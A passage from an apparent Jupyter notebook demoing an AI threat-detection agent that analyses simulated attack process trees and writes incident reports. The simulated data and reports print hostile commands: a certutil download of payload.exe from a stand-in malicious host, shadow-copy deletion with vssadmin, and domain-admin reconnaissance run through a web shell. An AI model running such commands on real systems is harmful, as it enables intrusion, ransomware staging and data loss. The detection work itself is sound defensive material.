#   - `-urlcache`: Invokes certutil's URL cache functionality — **not a legitimate administrative use case**.
#   - `-f`: Forces a download/overwrite of the target file.
#   - `http://malicious.example.com/payload.exe`: Explicit cleartext HTTP download of an executable from a named-malicious domain.
#   - `C:\Users\Public\payload.exe`: Destination is `C:\Users\Public\` — a **world-writable directory** commonly used by attackers to stage files accessible to all user contexts, avoiding `%TEMP%` detection heuristics.
#
# #### 🔸 Outbound TCP to `203.0.113.99:80`
# - **Why suspicious:** Cleartext HTTP (port 80) to a hardcoded IP associated with `malicious.example.com` is the C2/staging server contact for payload retrieval. The connection occurs **2 seconds after process spawn**, leaving no user-interaction window — confirming automated execution.
#
# ---
#
# ### 3. ATTACKER'S LIKELY OBJECTIVE
#
# This sequence represents **Stage 1 and Stage 2 of a multi-stage intrusion**:
#
# - **Stage 1 (Execution + Obfuscation):** The encoded PowerShell command is used to evade command-line audit logging and AMSI (Anti-Malware Scan Interface) inspection of the initial instruction set.
# - **Stage 2 (Payload Staging / Ingress Tool Transfer):** `certutil.exe` downloads `payload.exe` to `C:\Users\Public\` — a staging action, not a final execution. This strongly implies:
#   - The payload is a **second-stage implant** (RAT, Cobalt Strike beacon, Meterpreter stager, or similar).
#   - The attacker's objective is likely **initial foothold establishment** leading to **lateral movement, credential harvesting, or ransomware staging** in subsequent phases.
#   - The use of `C:\Users\Public\` suggests the attacker may plan to **execute the payload under a different user context** (e.g., via scheduled task or service).
#
# The pattern is consistent with **post-exploitation frameworks** (e.g., Cobalt Strike, Metasploit) or a **commodity malware dropper** with modular staging.
#
# ---
#
# ### 4. MITRE ATT\&CK TECHNIQUES
#
# | Technique ID | Name | Tactic | Observed Evidence |
# |---|---|---|---|
# | **T1059.001** | Command and Scripting Interpreter: PowerShell | Execution | `powershell.exe -EncodedCommand ...` as execution engine |
# | **T1027** | Obfuscated Files or Information | Defense Evasion | Base64 `-EncodedCommand` hides true command from logging/inspection |
# | **T1105** | Ingress Tool Transfer | Command and Control | `certutil.exe -urlcache -f http://[C2]/payload.exe` retrieves remote binary |
#
# **Secondary / Implied Techniques** (not directly observable but strongly inferred):
# - **T1218.003** — Signed Binary Proxy Execution: Certutil (`certutil.exe` as a LOLBin)
# - **T1140** — Deobfuscate/Decode Files or Information (Base64 decoding at PowerShell runtime)
#
# ---
#
# ### 5. CONFIDENCE ASSESSMENT
#
# **Confidence Level: 🔴 CRITICAL — 96%**
#
# #### Factors driving HIGH confidence:
# - ✅ **Complete pattern match** across all 4 PowerShell Download Cradle criteria with zero missing indicators
# - ✅ **No benign explanation** exists for `certutil.exe -urlcache -f [external URL]` dropped from a PowerShell child process
# - ✅ **Destination path** (`C:\Users\Public\`) is an attacker-preferred staging location, not a legitimate software install path
# - ✅ **Encoded command** partially decoded to `$c = New-Object` — consistent with `WebClient` download objects
# - ✅ **Timing** (6 seconds total, fully automated) rules out user-initiated behavior
#
# #### ⚠️ RECURRENCE ALERT — PATTERN SEEN BEFORE:
# > `get_similar_threats` returned **3 prior detections** of this exact pattern (PowerShell Download Cradle, T1059.001 + T1027 + T1105), all rated **CRITICAL at 0.96 confidence**, occurring on **2026-05-26** at `07:26`, `09:01`, and `09:02`.
#
# This is **not an isolated event.** Three near-identical detections within a ~90-minute window on the same date constitute a **campaign pattern** — indicating either:
# - A **persistent threat actor** with repeated access attempting multiple staging attempts (possibly retrying after detection/failure), or
# - A **worm/automated lateral movement tool** propagating across multiple endpoints using the same cradle technique.
#
# **Recommended Escalation:** Correlate all four events (3 prior + this trigger) by source host, user account, and network egress path. Treat as an **active campaign**, not a one-off incident. Prioritize hunting for `payload.exe` execution artifacts in `C:\Users\Public\` across the fleet immediately.
#
# RECOMMENDED ACTIONS
# -------------------
# 1. IMMEDIATE ISOLATION: Quarantine the affected endpoint(s) from the network to prevent lateral movement, C2 communication, and further payload staging — prioritize hosts where payload.exe may have already been retrieved to C:\Users\Public\.
# 2. ARTIFACT HUNTING: Search fleet-wide for C:\Users\Public\payload.exe, associated certutil.exe execution events, and any child processes spawned from C:\Users\Public\ using EDR telemetry; terminate any running instances of payload.exe immediately.
# 3. CAMPAIGN CORRELATION: Correlate all four detections (3 prior + current) by source host, user account, logon session, and network egress IP (203.0.113.99:80) to determine scope — assess whether this is a single persistent actor or automated worm-based lateral movement.
# 4. CREDENTIAL TRIAGE: Assume credential compromise on affected hosts; rotate passwords for all accounts with active sessions on isolated endpoints, prioritize privileged accounts, and check for new scheduled tasks, services, or registry run keys created around the time of each detected event.
# 5. FORENSIC PRESERVATION AND IOC BLOCKING: Preserve memory dumps and disk images of affected hosts before remediation; immediately block 203.0.113.99 and malicious.example.com at perimeter firewall and DNS, and submit payload.exe hash to threat intelligence platforms to identify the malware family and assess downstream impact risk.

# %% [markdown]
# ---
# ## 6. Agent tools & memory
#
# The ReAct agent in `analyze_sequence` has four tools. You can call them directly
# as Python functions without going through the full agent loop.

# %%
from cyber_ignition_agents.agent.tools import (
    format_process_tree,
    identify_attack_patterns,
    lookup_mitre_technique,
    get_similar_threats,
    format_process_sequence,
)

# All four are @tool-decorated LangChain tools
from cyber_ignition_agents.agent.agent import AGENT_TOOLS
print("Agent tools:")
for t in AGENT_TOOLS:
    print(f"  {t.name:<30} {t.description[:70]}")
# Out:
# Agent tools:
#   format_process_tree            Parse a JSON list of process events and return a readable process tree
#   identify_attack_patterns       Match a process execution sequence against known attack patterns.
# Retu
#   lookup_mitre_technique         Return name, tactic, and description for a MITRE ATT&CK technique ID (
#   get_similar_threats            Search persistent threat history for past detections semantically simi

# %%
# Tool 1: format_process_tree — converts raw event JSON to a readable tree
raw = json.dumps(events_b)          # Web shell events as JSON string
tree = format_process_tree.invoke(raw)
print(tree)
# Out:
# [09:13:26] w3wp.exe (pid 5678) spawned by svchost.exe (pid 4567)
#            cmdline: c:\windows\system32\inetsrv\w3wp.exe -ap DefaultAppPool
# [09:13:27] cmd.exe (pid 6543) spawned by w3wp.exe (pid 5678)
#            cmdline: cmd.exe /c whoami
# [09:13:29] cmd.exe (pid 6544) spawned by w3wp.exe (pid 5678)
#            cmdline: cmd.exe /c net user
# [09:13:31] cmd.exe (pid 6545) spawned by w3wp.exe (pid 5678)
#            cmdline: cmd.exe /c ipconfig /all
# [09:13:33] cmd.exe (pid 6546) spawned by w3wp.exe (pid 5678)
#            cmdline: cmd.exe /c net group "Domain Admins" /domain

# %%
# Tool 2: identify_attack_patterns — pure regex/string matching, no LLM
seq = format_process_sequence(events_b)    # use the plain helper (not @tool)
result = identify_attack_patterns.invoke(seq)
print(result)
# Out:
# Web Shell Execution — Techniques: T1505.003, T1033, T1087, T1016

# %%
# Tool 3: lookup_mitre_technique — local lookup table, no LLM
for tid in ["T1505.003", "T1059.001", "T1490", "T1486"]:
    print(lookup_mitre_technique.invoke(tid))
    print()
# Out:
# ID: T1505.003
# Name: Server Software Component: Web Shell
# Tactic: Persistence
# Description: Web worker (w3wp.exe, httpd.exe) spawning interactive shells is the primary indicator.
#
# ID: T1059.001
# Name: Command and Scripting Interpreter: PowerShell
# Tactic: Execution
# Description: Abused via -EncodedCommand, -enc, -ep Bypass, -nop, -w hidden to evade logging.
#
# ID: T1490
# Name: Inhibit System Recovery
# Tactic: Impact
# Description: 'vssadmin delete shadows /all /quiet' destroys backups before ransomware.
#
# ID: T1486
# Name: Data Encrypted for Impact
# Tactic: Impact
# Description: Mass renames to .locked/.encrypted; ransom notes (README_DECRYPT.txt).

# %%
# Tool 4: get_similar_threats — semantic search over ChromaDB threat history
# (will be empty until you run a full scenario that saves a threat record)
result = get_similar_threats.invoke("powershell encoded command certutil download")
print(result)
# Out:
# Found 3 similar past detection(s):
#
#   [2026-05-26T09:02:50] CRITICAL (conf 0.96) — PowerShell Download Cradle
#   Techniques: T1059.001 - Command and Scripting Interpreter: PowerShell, T1027 - Obfuscated Files or Information, T1105 - Ingress Tool Transfer
#
#   [2026-05-26T09:14:57] CRITICAL (conf 0.96) — PowerShell Download Cradle
#   Techniques: T1059.001 - Command and Scripting Interpreter: PowerShell, T1027 - Obfuscated Files or Information, T1105 - Ingress Tool Transfer
#
#   [2026-05-26T07:26:32] CRITICAL (conf 0.96) — PowerShell Download Cradle
#   Techniques: T1059.001 - Command and Scripting Interpreter: PowerShell, T1027 - Obfuscated Files or Information, T1105 - Ingress Tool Transfer

# %% [markdown]
# ### Memory — ChromaDB + JSON threat history

# %%
from cyber_ignition_agents.memory.store import search_similar_threats, _load_json

history = _load_json()
print(f"Threat history: {len(history)} records")
if history:
    print()
    for r in history[-5:]:
        conf = r.get('confidence', 0)
        print(f"  [{r['timestamp'][:19]}]  {r['threat_level']:<8}  conf={conf:.2f}  {r['scenario']}")
# Out:
# Threat history: 14 records
#
#   [2026-05-26T08:59:07]  CRITICAL  conf=0.97  Ransomware Staging
#   [2026-05-26T09:00:23]  CRITICAL  conf=0.95  Web Shell Activity
#   [2026-05-26T09:01:37]  CRITICAL  conf=0.96  PowerShell Download Cradle
#   [2026-05-26T09:02:50]  CRITICAL  conf=0.96  PowerShell Download Cradle
#   [2026-05-26T09:14:57]  CRITICAL  conf=0.96  PowerShell Download Cradle

# %%
# Semantic similarity search across all past threat records
# Useful for: "have we seen this technique before?"
results = search_similar_threats("web shell reconnaissance whoami net user", n_results=3)
if results:
    for r in results:
        print(f"  {r['threat_level']}  {r['scenario']}  ({r['timestamp'][:19]})")
        print(f"  distance={r['distance']:.3f}  techniques: {', '.join(r['techniques'][:2])}")
        print()
else:
    print("No records yet — run section 7 or 8 first to populate threat history.")
# Out:
#   CRITICAL  Web Shell Activity  (2026-05-26T09:00:23)
#   distance=0.860  techniques: T1505.003 - Server Software Component: Web Shell, T1033 - System Owner/User Discovery
#
#   CRITICAL  Web Shell Activity  (2026-05-25T09:32:19)
#   distance=0.891  techniques: T1505.003 - Server Software Component: Web Shell, T1033 - System Owner/User Discovery
#
#   CRITICAL  Web Shell Activity  (2026-05-26T07:25:19)
#   distance=1.012  techniques: T1505.003 - Server Software Component: Web Shell, T1033 - System Owner/User Discovery

# %% [markdown]
# ---
# ## 7. Full run — rules mode (Category 3)
#
# `watch_simulated()` feeds events through `is_trigger()` → `triage_with_llm()` → `run_scenario()`.
#
# The report footer will read:
# ```
# Initiated by: environment signal (process monitor)
# Human involvement: none at detection or analysis stage
# ```
#
# > **LLM calls:** 1 Haiku (triage) + 3-4 Sonnet (pipeline). Expect 2–4 minutes.

# %%
from cyber_ignition_agents.sensor.monitor import watch_simulated
from cyber_ignition_agents.agent.graph import run_scenario

# ── choose scenario ─────────────────────────────────────────────────────────
RULES_EVENTS = events_c       # try events_a / events_b / events_c / events_n
RULES_NAME   = name_c
# ────────────────────────────────────────────────────────────────────────────

RULES_SESSION = datetime.now().strftime("%Y%m%d_%H%M%S") + "_rules"
rules_report  = None

def on_rules_trigger(snapshot: dict, all_events: list):
    global rules_report
    rules_report = run_scenario(
        RULES_NAME, snapshot, all_events,
        session_id=RULES_SESSION,
    )

print(f"Running {RULES_NAME} in rules mode...")
fired = watch_simulated(RULES_NAME, RULES_EVENTS, on_rules_trigger, delay=0.0)

if not fired:
    # Normal scenario: no signature matched — run pipeline directly for comparison
    e0 = RULES_EVENTS[0]
    trigger = {"pid": e0["pid"], "name": e0["name"],
               "parent_pid": e0.get("parent_pid"), "parent_name": e0.get("parent_name"),
               "cmdline": e0.get("cmdline", "")}
    rules_report = run_scenario(RULES_NAME, trigger, RULES_EVENTS, session_id=RULES_SESSION)
# Out:
# Running Ransomware Staging in rules mode...
# [sensor] Simulated feed: Ransomware Staging
# [sensor] Watching 6 events...
#
#   [09:13:26] update.exe (pid 8888)  ←  —
#   [09:13:27] vssadmin.exe (pid 9001)  ←  update.exe
#
# [sensor] *** TRIGGER: vssadmin.exe (pid 9001) matched a signature ***
# [sensor] Running LLM triage...
# [sensor] [TRIAGE] FIRE — This exhibits classic ransomware behavior: a suspicious Temp-based executable spawning vssadmin to delete volume shadows (backup destruction), followed by notepad opening a ransom note, indicating active encryption attack in progress.
# [sensor] Environment signal confirmed — initiating pipeline...
#
#   [1/5] trigger_received  — vssadmin.exe (pid 9001) <- update.exe
#   [2/5] monitor_activity  — 6 events collected
#   [3/5] analyze_sequence  — invoking ReAct agent...
#   [Anthropic API call] model=claude-sonnet-4-6  messages=2  ts=09:14:59
#   [Anthropic API call] model=claude-sonnet-4-6  messages=6  ts=09:15:09
#   [Anthropic API call] model=claude-sonnet-4-6  messages=10  ts=09:15:13
#   [4/5] classify_threat   — calling LLM...
#   [Anthropic API call] model=claude-sonnet-4-6  node=classify_threat  ts=09:16:04
#   [5/5] generate_report   — formatting output

# %%
print(rules_report)
# Out:
# CYBER-SENSE THREAT REPORT
# ==========================
# Timestamp: 2026-05-26 09:16:14
# Trigger:   vssadmin.exe spawned from update.exe
#
# Initiated by: environment signal (process monitor)
# Human involvement: none at detection or analysis stage
#
# PROCESS SEQUENCE
# ----------------
# [09:13:26] update.exe (pid 8888) spawned by — (pid —)
#            cmdline: C:\Users\Public\AppData\Local\Temp\update.exe
#            note:    Unsigned binary — path: C:\Users\Public\AppData\Local\Temp\update.exe
# [09:13:27] vssadmin.exe (pid 9001) spawned by update.exe (pid 8888)
#            cmdline: vssadmin.exe delete shadows /all /quiet
# [09:13:29] update.exe (pid 8888) — Mass rename: Desktop\*.* → Desktop\*.locked (47 files)
# [09:13:30] update.exe (pid 8888) — Mass rename: Documents\*.* → Documents\*.locked (213 files)
# [09:13:31] update.exe (pid 8888) — Mass rename: Downloads\*.* → Downloads\*.locked (89 files)
# [09:13:32] notepad.exe (pid 9002) spawned by update.exe (pid 8888)
#            cmdline: notepad.exe C:\Users\Public\Desktop\README_DECRYPT.txt
#
# THREAT CLASSIFICATION
# ---------------------
# Level:      CRITICAL
# Confidence: 0.97
# Technique:  T1490 - Inhibit System Recovery
#             T1486 - Data Encrypted for Impact
#             T1036.005 - Masquerading: Match Legitimate Name or Location
#             T1059.001 - Command and Scripting Interpreter: PowerShell
#             T1105 - Ingress Tool Transfer
#
# ANALYSIS
# --------
# All data collected. Here is the complete structured threat analysis.
#
# ---
#
# # 🔴 THREAT ANALYSIS REPORT — CRITICAL SEVERITY
#
# ---
#
# ## 1. Attack Pattern Match: **Ransomware Staging** ✅ HIGH CONFIDENCE
#
# This execution sequence is a **textbook, near-perfect match** for the **Ransomware Staging** pattern. Every stage of the canonical kill chain is present and executed in the correct temporal order within a **6-second window**:
#
# | Stage | Expected Behavior | Observed |
# |---|---|---|
# | **Initial Execution** | Unsigned binary from `%TEMP%`/AppData | `update.exe` from `C:\Users\Public\AppData\Local\Temp\` — unsigned |
# | **Backup Destruction** | Spawn `vssadmin.exe delete shadows /all /quiet` | ✅ PID 9001 at 09:13:27 |
# | **File Encryption/Rename** | Mass extension change to `.locked`/`.encrypted` | ✅ 349 files renamed across 3 directories |
# | **Ransom Note Drop** | Spawn `notepad.exe` opening `README_DECRYPT.txt` | ✅ PID 9002 at 09:13:32 |
#
# This does **not** match any benign pattern. None of the benign exclusions (browser spawning, IDE activity, `svchost.exe`, `sshd`/`bash`) are present or applicable.
#
# ---
#
# ## 2. Suspicious Processes & Behaviors — Technical Breakdown
#
# ### 🔴 `update.exe` (PID 8888) — Primary Malicious Actor
# - **Path anomaly:** Executing from `C:\Users\Public\AppData\Local\Temp\` — this is a **world-writable, low-privilege directory** used as a staging ground by malware to avoid detection in protected system paths. Legitimate `update.exe` binaries ship from vendor-specific directories (e.g., `C:\Program Files\...`), never from `Public\Temp`.
# - **Unsigned binary:** No code-signing certificate. Legitimate software updaters are virtually always signed by their publishers.
# - **No parent process:** The absence of a parent PID is suspicious — it suggests this was likely dropped and executed via a method that severed the parent chain (e.g., a scheduled task, WMI invocation, or a prior stage that self-terminated). This is a deliberate anti-forensics behavior.
# - **Masquerading (T1036.005):** The binary deliberately uses the name `update.exe` to impersonate legitimate software update utilities (Windows Update agent, application updaters), a classic social engineering / evasion technique.
# - **File system impact:** Directly responsible for renaming **349 files** in 3 seconds across three high-value user directories.
#
# ### 🔴 `vssadmin.exe` (PID 9001) — Backup Destruction Utility
# - **Spawned by `update.exe`**, not by a legitimate system process like `services.exe` or `svchost.exe`.
# - **Exact command:** `vssadmin.exe delete shadows /all /quiet` — this is the **single most widely observed pre-ransomware command** in threat intelligence. The `/all` flag removes **every Volume Shadow Copy** on every volume; `/quiet` suppresses UAC prompts and console output to avoid user awareness.
# - **Timing is deliberate:** Executed at `09:13:27` — **2 seconds before file encryption begins at 09:13:29**. This ordering is intentional: destroying recovery mechanisms before encrypting files eliminates the victim's primary self-recovery option.
#
# ### 🔴 Mass File Renames → `.locked` Extension
# - **349 files affected** across `Desktop` (47), `Documents` (213), `Downloads` (89) in 3 seconds — a throughput rate consistent with automated ransomware I/O, not user activity.
# - The `.locked` extension is a well-documented ransomware marker used by families including **LockBit**, **Phobos**, **GlobeImposter**, and others.
# - Targeting `Desktop`, `Documents`, and `Downloads` is strategically deliberate — these are the highest-value, most user-critical directories and are the first targets for ransomware strains that prioritize quick impact over full disk encryption.
#
# ### 🔴 `notepad.exe` (PID 9002) — Ransom Note Delivery
# - Spawned by `update.exe` at `09:13:32`, immediately after encryption completes.
# - Opens `C:\Users\Public\Desktop\README_DECRYPT.txt` — the filename `README_DECRYPT.txt` is a canonical ransomware note filename. Placement on the **Public Desktop** ensures visibility to all logged-in users.
# - Using `notepad.exe` as the delivery vehicle is a deliberate choice — it is a trusted Windows binary (LOLBIN usage) that will not be blocked by application allowlisting.
#
# ---
#
# ## 3. Attacker's Likely Objective
#
# **Financial extortion via ransomware.**
#
# The attack follows the standard **double-pressure ransomware playbook**:
# 1. **Eliminate recovery options** (VSS deletion) → prevent self-remediation without paying.
# 2. **Encrypt high-value user data** (349 files across critical directories) → create immediate operational disruption.
# 3. **Display ransom demand** (`README_DECRYPT.txt`) → communicate payment terms and decryption mechanism.
#
# The targeting of `Documents` (213 files — the largest set) suggests the ransomware prioritized business/personal document content. The sub-6-second execution timeline is engineered to complete encryption before security tools or a user can intervene.
#
# The use of `C:\Users\Public\` as both the execution staging path and the ransom note drop location may suggest this is a **multi-user system** (shared workstation or RDP session), where `Public` directories are accessible across all user accounts — maximizing impact and visibility.
#
# ---
#
# ## 4. MITRE ATT&CK Technique Mapping
#
# | Technique ID | Name | Tactic | Evidence |
# |---|---|---|---|
# | **T1490** | Inhibit System Recovery | Impact | `vssadmin.exe delete shadows /all /quiet` executed by `update.exe` at 09:13:27 |
# | **T1486** | Data Encrypted for Impact | Impact | Mass rename of 349 files to `.locked`; `README_DECRYPT.txt` drop |
# | **T1036.005** | Masquerading: Match Legitimate Name or Location | Defense Evasion | `update.exe` name mimics legitimate update utilities; unsigned binary in `Temp` path |
#
# > **Note on T1036.005:** The MITRE lookup returned no local entry for this sub-technique, but the historical threat intelligence database confirmed its presence in two prior similar detections (confidence 0.97). The behavioral evidence for masquerading is unambiguous and independently supported.
#
# ---
#
# ## 5. Confidence Assessment & Threat Recurrence
#
# ### Confidence: **CRITICAL — 0.97**
#
# **Factors elevating confidence:**
# - ✅ **Perfect pattern alignment:** All four stages of Ransomware Staging are present with zero deviations from the expected pattern.
# - ✅ **Temporal coherence:** The 6-second execution window is consistent with automated ransomware execution, not coincidental process activity.
# - ✅ **No false-positive indicators:** None of the behaviors observed have a plausible legitimate explanation (unsigned binary from `Temp`, VSS deletion, mass `.locked` renames, ransom note).
# - ✅ **Exact command-line match:** `vssadmin.exe delete shadows /all /quiet` is one of the highest-fidelity ransomware indicators in threat intelligence databases.
#
# ### ⚠️ Pattern Recurrence Confirmed — ELEVATED RISK
#
# **Historical threat intelligence flagged 2 prior CRITICAL-confidence Ransomware Staging detections** with identical technique fingerprints (T1490 + T1486 + T1036.005):
# - `[2026-05-26T07:24:16]` — Confidence 0.97
# - `[2026-05-26T08:59:07]` — Confidence 0.97
#
# **These detections occurred earlier the same day** (07:24 and 08:59 vs. the current 09:13 event). This strongly indicates:
# 1. **Active, ongoing campaign** — this is not an isolated incident but a coordinated wave of attacks within a ~2-hour window.
# 2. **Possible lateral movement or reinfection** — the same TTPs are being applied across multiple systems or sessions in rapid succession.
# 3. **The PowerShell Download Cradle detection at 07:26:32** (T1059.001 + T1027 + T1105) occurring between the two ransomware events suggests a likely **two-stage attack**: PowerShell-based initial access/payload delivery (07:26) followed by ransomware detonation. This may represent the **delivery mechanism** for `update.exe`.
#
# ---
#
# ## 🚨 Recommended Immediate Actions
#
# 1. **ISOLATE** the affected host from the network immediately to prevent lateral spread.
# 2. **KILL** `update.exe` (PID 8888) if still running — encryption may still be in progress on unmapped directories.
# 3. **PRESERVE** forensic image before any remediation — capture memory dump and disk image.
# 4. **SCOPE** the campaign by correlating the two prior detections (07:24, 08:59) — identify whether additional hosts are affected.
# 5. **HUNT** for `update.exe` in `%TEMP%` / `AppData\Local\Temp` paths across the environment using EDR.
# 6. **HUNT** for PowerShell activity matching the 07:26:32 cradle detection — identify the initial access vector and any other staged payloads.
# 7. **CHECK** for persistence mechanisms (`HKCU\Run`, scheduled tasks, startup folders) — ransomware frequently establishes persistence as a fallback.
#
# RECOMMENDED ACTIONS
# -------------------
# 1. IMMEDIATELY isolate the affected host from all network connectivity (wired, wireless, VPN) to prevent lateral movement and C2 communication.
# 2. KILL update.exe (PID 8888) if still active to halt ongoing file encryption, then preserve a full memory dump and forensic disk image before any remediation.
# 3. SCOPE the campaign by correlating the two prior CRITICAL detections (07:24:16 and 08:59:07) and the PowerShell cradle event (07:26:32) — identify all affected hosts via EDR-wide hunt for update.exe in %TEMP% and AppData\Local\Temp paths.
# 4. HUNT across the enterprise for the PowerShell download cradle TTPs (T1059.001 + T1027 + T1105) observed at 07:26:32 to identify the initial access vector, any additional staged payloads, and other systems that may have received update.exe.
# 5. CHECK for persistence mechanisms on all affected systems including HKCU\Run, HKLM\Run, scheduled tasks, and startup folders, and engage incident response procedures for potential data exfiltration assessment given the double-extortion ransomware playbook.

# %% [markdown]
# ---
# ## 8. Full run — orchestrator mode (Category 4)
#
# `watch_with_orchestrator()` replaces the `TRIGGER_SIGNATURES` check with an
# `OrchestratorSession`. The model decides when to investigate and why.
#
# The report footer will read:
# ```
# ORCHESTRATOR DECISION
# ---------------------
# Decision:   INVESTIGATE
# Reasoning:  <orchestrator's 2-4 sentence reasoning>
#
# Initiated by: autonomous orchestrator reasoning (no pre-specified rules)
# Human involvement: none at initiation, analysis, or detection stage
# ```
#
# > **LLM calls:** 2-4 Haiku (orchestrator) + 3-4 Sonnet (pipeline). Expect 2–4 minutes.

# %%
from cyber_ignition_agents.sensor.monitor import watch_with_orchestrator

# ── choose scenario ─────────────────────────────────────────────────────────
ORCH_EVENTS = events_b        # try events_a / events_b / events_c / events_n
ORCH_NAME   = name_b
# ────────────────────────────────────────────────────────────────────────────

ORCH_SESSION = datetime.now().strftime("%Y%m%d_%H%M%S") + "_orch"
orch_report  = None

def on_orch_trigger(snapshot: dict, all_events: list, orchestrator_reasoning: str = ""):
    global orch_report
    orch_report = run_scenario(
        ORCH_NAME, snapshot, all_events,
        session_id=ORCH_SESSION,
        orchestrator_reasoning=orchestrator_reasoning,
    )

print(f"Running {ORCH_NAME} in orchestrator mode...")
fired = watch_with_orchestrator(ORCH_NAME, ORCH_EVENTS, on_orch_trigger, delay=0.0)

if not fired:
    e0 = ORCH_EVENTS[0]
    trigger = {"pid": e0["pid"], "name": e0["name"],
               "parent_pid": e0.get("parent_pid"), "parent_name": e0.get("parent_name"),
               "cmdline": e0.get("cmdline", "")}
    orch_report = run_scenario(ORCH_NAME, trigger, ORCH_EVENTS, session_id=ORCH_SESSION)
# Out:
# Running Web Shell Activity in orchestrator mode...
# [orchestrator] Adaptive sensing: Web Shell Activity
# [orchestrator] No pre-specified rules — reasoning from general knowledge
#
#   [09:13:26] w3wp.exe (pid 5678)  ←  svchost.exe
#   [09:13:27] cmd.exe (pid 6543)  ←  w3wp.exe
#   [09:13:29] cmd.exe (pid 6544)  ←  w3wp.exe
#   [09:13:31] cmd.exe (pid 6545)  ←  w3wp.exe
#   [09:13:33] cmd.exe (pid 6546)  ←  w3wp.exe
#
# [orchestrator] *** INVESTIGATE ***
# [orchestrator] w3wp.exe (IIS application pool process) is spawning multiple cmd.exe instances in rapid succession (within 7 seconds) executing reconnaissance commands (whoami, net user, ipconfig, Domain Admins enumeration). This pattern is consistent with post-compromise activity or web application exploitation, as legitimate IIS operations rarely invoke command shells for system reconnaissance. The progression from privilege discovery to domain enumeration suggests active exploitation in progress.
# [orchestrator] Initiating analysis pipeline...
#
#   [1/5] trigger_received  — cmd.exe (pid 6546) <- w3wp.exe
#   [2/5] monitor_activity  — 5 events collected
#   [3/5] analyze_sequence  — invoking ReAct agent...
#   [Anthropic API call] model=claude-sonnet-4-6  messages=2  ts=09:16:20
#   [Anthropic API call] model=claude-sonnet-4-6  messages=6  ts=09:16:28
#   [Anthropic API call] model=claude-sonnet-4-6  messages=11  ts=09:16:32
#   [4/5] classify_threat   — calling LLM...
#   [Anthropic API call] model=claude-sonnet-4-6  node=classify_threat  ts=09:17:12
#   [5/5] generate_report   — formatting output

# %%
print(orch_report)
# Out:
# CYBER-SENSE THREAT REPORT
# ==========================
# Timestamp: 2026-05-26 09:17:19
# Trigger:   cmd.exe spawned from w3wp.exe
#
# ORCHESTRATOR DECISION
# ---------------------
# Decision:   INVESTIGATE
# Reasoning:  w3wp.exe (IIS application pool process) is spawning multiple cmd.exe instances in rapid succession (within 7 seconds) executing reconnaissance commands (whoami, net user, ipconfig, Domain Admins enumeration). This pattern is consistent with post-compromise activity or web application exploitation, as legitimate IIS operations rarely invoke command shells for system reconnaissance. The progression from privilege discovery to domain enumeration suggests active exploitation in progress.
#
# Initiated by: autonomous orchestrator reasoning (no pre-specified rules)
# Human involvement: none at initiation, analysis, or detection stage
#
# PROCESS SEQUENCE
# ----------------
# [09:13:26] w3wp.exe (pid 5678) spawned by svchost.exe (pid 4567)
#            cmdline: c:\windows\system32\inetsrv\w3wp.exe -ap DefaultAppPool
# [09:13:27] cmd.exe (pid 6543) spawned by w3wp.exe (pid 5678)
#            cmdline: cmd.exe /c whoami
# [09:13:29] cmd.exe (pid 6544) spawned by w3wp.exe (pid 5678)
#            cmdline: cmd.exe /c net user
# [09:13:31] cmd.exe (pid 6545) spawned by w3wp.exe (pid 5678)
#            cmdline: cmd.exe /c ipconfig /all
# [09:13:33] cmd.exe (pid 6546) spawned by w3wp.exe (pid 5678)
#            cmdline: cmd.exe /c net group "Domain Admins" /domain
#
# THREAT CLASSIFICATION
# ---------------------
# Level:      CRITICAL
# Confidence: 0.95
# Technique:  T1505.003 - Server Software Component: Web Shell
#             T1033 - System Owner/User Discovery
#             T1087 - Account Discovery
#             T1016 - System Network Configuration Discovery
#
# ANALYSIS
# --------
# All data collected. Here is the complete structured threat analysis.
#
# ---
#
# # 🔴 THREAT ANALYSIS REPORT — CRITICAL SEVERITY
#
# ---
#
# ## 1. Attack Pattern Match: **Web Shell Execution**
#
# This sequence is a **textbook, high-confidence Web Shell Execution** event. The defining structural indicator is `w3wp.exe` (Microsoft IIS worker process) directly spawning interactive `cmd.exe` children. This is **not a legitimate IIS behavior** — the IIS worker process serves HTTP content; it has no business reason to invoke a command shell. The only credible explanation is that an attacker has planted a web shell (e.g., an ASPX/PHP backdoor file) on the IIS server, and is now issuing OS commands through it via HTTP requests.
#
# The pattern matches the reference definition precisely:
# > *"Web worker process (w3wp.exe) spawns cmd.exe → shell executes reconnaissance commands: whoami, net user, net group, ipconfig"*
#
# ---
#
# ## 2. Suspicious Processes and Behaviors
#
# ### 🔴 Process Lineage Anomaly
# ```
# svchost.exe (pid 4567)
#   └── w3wp.exe (pid 5678) [DefaultAppPool]
#         ├── cmd.exe (pid 6543)  → whoami
#         ├── cmd.exe (pid 6544)  → net user
#         ├── cmd.exe (pid 6545)  → ipconfig /all
#         └── cmd.exe (pid 6546)  → net group "Domain Admins" /domain  ← TRIGGER
# ```
#
# | Process | PID | Why Suspicious |
# |---|---|---|
# | `w3wp.exe` as shell parent | 5678 | IIS worker processes **never** legitimately spawn `cmd.exe`. This is the single strongest indicator of web shell compromise. |
# | `cmd.exe /c whoami` | 6543 | Classic first-step post-exploitation check — confirms code execution context and identity of the compromised IIS service account. |
# | `cmd.exe /c net user` | 6544 | Enumerates all local user accounts. Attacker is mapping the access landscape. |
# | `cmd.exe /c ipconfig /all` | 6545 | Full network configuration dump. Attacker is mapping subnets, DNS servers, and domain membership for lateral movement planning. |
# | `cmd.exe /c net group "Domain Admins" /domain` | 6546 | **Most critical command.** Active Directory query targeting the highest-privilege group. Attacker is identifying specific DA accounts to target for privilege escalation or credential theft. |
#
# ### ⏱️ Timing Pattern
# The commands are issued in **2-second intervals** (09:13:27 → 29 → 31 → 33). This regularity is consistent with **scripted or tool-driven execution** rather than a human typing — suggesting an automated web shell client or a post-exploitation framework (e.g., Cobalt Strike, Metasploit) making sequential HTTP requests.
#
# ### 🎯 Command Escalation Pattern
# The command sequence follows a **deliberate reconnaissance escalation ladder**:
# 1. `whoami` → *"Who am I running as?"*
# 2. `net user` → *"What local accounts exist?"*
# 3. `ipconfig /all` → *"What network am I on?"*
# 4. `net group "Domain Admins" /domain` → *"Who are the highest-value targets in the domain?"*
#
# This is not random — it follows a well-known post-exploitation playbook for **initial access → situational awareness → target identification**.
#
# ---
#
# ## 3. Attacker's Likely Objective
#
# The attacker has achieved **initial foothold on an IIS web server** and is in the **Discovery phase** of an Active Directory-targeted attack. Based on the final command (`net group "Domain Admins" /domain`), the **primary objective is Domain Compromise**.
#
# **Likely kill chain continuation (projected):**
# - Identify DA account usernames → target them for **credential harvesting** (e.g., via Mimikatz, LSASS dump, Kerberoasting)
